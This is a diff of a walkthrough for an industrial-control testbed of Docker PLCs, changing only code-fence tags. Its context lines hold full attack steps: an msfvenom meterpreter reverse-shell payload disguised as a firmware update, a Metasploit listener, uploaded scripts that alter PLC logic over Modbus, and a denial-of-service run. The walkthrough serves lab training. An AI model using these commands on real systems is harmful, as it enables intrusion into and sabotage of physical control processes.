@@ -7,7 +7,7 @@ At this level, we consider you've installed the original testbed network (i.e fr
 
 Docker Containers
 
-```
+```bash
 docker ps 
 ```
 
@@ -49,7 +49,7 @@ Displays the list of containers, you should have 06 plcs running, scadaBR and si
 ## *Accessing the Components on via the docker cli*
 
 bash:
-```
+```bash
 # For plc11
 docker exec -it plc11 bash 
 # For plc12
@@ -62,7 +62,7 @@ docker exec -it plc12 bash
 ## *Setting up the attacker's machine*
 
 Docker command:
-```
+```bash
 sudo docker run -d -t --net swat --hostname attacker --name attacker --privileged --ip 172.18.0.18 -p 10018:8080 kalilinux/kali-rolling
 ```
 
@@ -79,7 +79,7 @@ Docker container
 ## *Accessing the attacker's machine via the docker cli*
 
 bash:
-```
+```bash
 docker exec -it attacker bash
 ```
 
@@ -92,7 +92,7 @@ The first scenario consist of exploiting the sqlite database of OpenPLC using a 
 If Metasploit is not installed, follow these steps:
 
 Attacker's terminal
-```
+```bash
 apt-get update && apt-get install -y git curl wget python3-pip
 apt install metasploit-framework
 ```
@@ -104,7 +104,7 @@ apt install metasploit-framework
 #### *Command to craft the payload in the attacker's machine*
 
 Attacker's terminal
-```
+```bash
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.115 LPORT=4444 -f elf -o firmware_update.elf
 ``` 
 
@@ -112,14 +112,14 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.115 LPORT=4444 -f 
 - In our attack scenario, we assume the phising attack went on successfullu, so we simply upload the crafted payload into the target container
 
 bash 
-```
+```bash
 docker cp attacker:/scripts/firmware_update.elf plc11:/workdir
 ```
 
 Then in plc11, we run this 
 
 Plc11 terminal
-```
+```bash
 cd workdir
 chmod +x firmware_update.elf
 ./firmware_update.elf
@@ -130,7 +130,7 @@ chmod +x firmware_update.elf
 #### *Set up a Metasploit Listener:*
 
 Attacker's terminal
-```
+```bash
 msfconsole
 use exploit/multi/handler
 set payload linux/x86/meterpreter/reverse_tcp
@@ -143,20 +143,20 @@ exploit
 - The attacker can now manipulate the plc and executes any scripts he wishes, the attack uploads the `db-attack.py` to plc's machine
 
 Illustration in meterpreter terminal:
-```
+```bash
 upload /path/to/local/file /path/on/target/ (Upload from attacker to target machine)
 ```
 
 Example
 
 Meterpreter terminal
-```
+```bash
 upload /scripts/db-attack.py /workdir
 ```
 - After uplaoding the script in the target's machine, he can execute the script with ease from the meterpreter terminal
 
 Meterpreter terminal
-```
+```bash
 shell
 python3 db-attack.py
 ```
@@ -172,14 +172,14 @@ The attacker changes the code logic of the plc without stopping it or without be
 - He uses the same attack method as in scenario 1
 
 Meterpreter terminal
-```
+```bash
 upload /scripts/code-injection.py /workdir
 ```
 
 - The attacker can now execute the script into the target's machine, he needs the ip address and the modbus port number. He eventually obtained them from the reconnaissance phase
 
 Meterpreter terminal
-```
+```bash
 shell
 python3 code-injection.py -t 172.18.0.11 -p 502
 ```
@@ -198,7 +198,7 @@ In this scenario, the attacker's aim is to make the plc unaccessible. The HMI an
 ### The DDOS script developped by Matrix
 
 Attacker terminal
-```
+```bash
 # Clone the repository
 git clone https://github.com/SpiderLabs/MATRIX.git
 cd matrix
@@ -210,19 +210,19 @@ apt-get install libpcap-dev
 
 - Run the DOS command from the attacker's machine, the attacker doesn't need to be in the target's machine: 
 
-```
+```bash
 python matrix.py -H 172.18.0.11 -p 502 -a dos -t 1000
 ```
 
 - When the attack is lauched, you could verify by getting to the plc's terminal, it is preferable to open a terminal for plc before the attack
 
 bash
-```
+```bash
 docker exec -it plc11 bash
 ```
 
 plc11 terminal
-```
+```bash
 # Install htop to verify cpu metrics
 apt install htop
 htop
